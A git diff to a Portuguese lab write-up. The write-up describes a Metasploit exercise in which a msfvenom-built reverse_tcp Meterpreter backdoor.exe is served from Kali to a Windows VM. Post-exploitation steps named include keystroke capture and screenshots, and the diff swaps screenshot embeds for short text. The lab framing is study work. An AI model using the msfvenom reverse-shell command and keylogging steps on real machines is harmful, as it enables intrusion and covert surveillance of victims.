@@ -44,13 +44,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f e
 
 A entrega do arquivo `backdoor.exe` foi simulada via um simples **Python HTTP Server** rodando no Kali, acessado pelo navegador da máquina Windows.
 
-![Tela do Kali Linux mostrando o terminal com o Metasploit console e uma máquina virtual Windows 7/XP à esquerda](assets/1_kali_msfconsole.jpg)
-*Imagem 1: Configuração do ambiente no Kali Linux com o Metasploit e a VM Windows.*
-
 O payload foi disponibilizado para download e execução na máquina vítima.
-
-![Tela do Kali Linux exibindo o Python HTTP Server em execução e a VM Windows 7/XP à esquerda, mostrando o download do backdoor.exe pelo Internet Explorer](assets/4_payload_download_server.jpg)
-*Imagem 4: Servidor HTTP em Python no Kali, disponibilizando o `backdoor.exe` para download na VM Windows.*
 
 ### 2. Configuração e Execução do Listener (Metasploit)
 
@@ -71,8 +65,7 @@ Após a execução do payload na máquina Windows, uma sessão Meterpreter foi e
 
 Com a sessão Meterpreter aberta, foram executados diversos comandos para demonstrar a capacidade de acesso e controle sobre a máquina vítima.
 
-![Terminal do Kali Linux com a sessão Meterpreter ativa, exibindo comandos como getuid, ls e a tentativa de keyscan_start e keyscan_dump. Há também uma linha de texto digitado na sessão.](assets/2_meterpreter_keyscan_dump.jpg)
-*Imagem 2: Sessão Meterpreter ativa, mostrando comandos de pós-exploração e a captura de teclas.*
+
 
 **Comandos de Estudo Executados:**
 
@@ -89,12 +82,10 @@ Com a sessão Meterpreter aberta, foram executados diversos comandos para demons
 As seguintes imagens comprovam o sucesso das operações de pós-exploração:
 
 * **Screenshot da Máquina Vítima:**
-    ![Visualizador de imagens no Kali Linux exibindo um screenshot da área de trabalho do Windows 7/XP, com ícones como "Lixeira" e "backdoor".](assets/3_kali_screenshot_viewer.jpg)
-    *Imagem 3: Screenshot da área de trabalho da máquina Windows vítima, obtida via Meterpreter.*
+Pelo comando screenshot
 
 * **Verificação de Conexão (netstat na Vítima):**
-    ![Console do Windows 7/XP exibindo o resultado do comando netstat -ano, com uma conexão TCP LISTENING na porta 4444 e uma ESTABLISHED com o IP do Kali Linux.](assets/5_windows_netstat.jpg)
-    *Imagem 5: Saída do comando `netstat` na máquina Windows, confirmando a conexão reversa ativa na porta 4444.*
+pelo comando netstat -ano
 
 ---
 
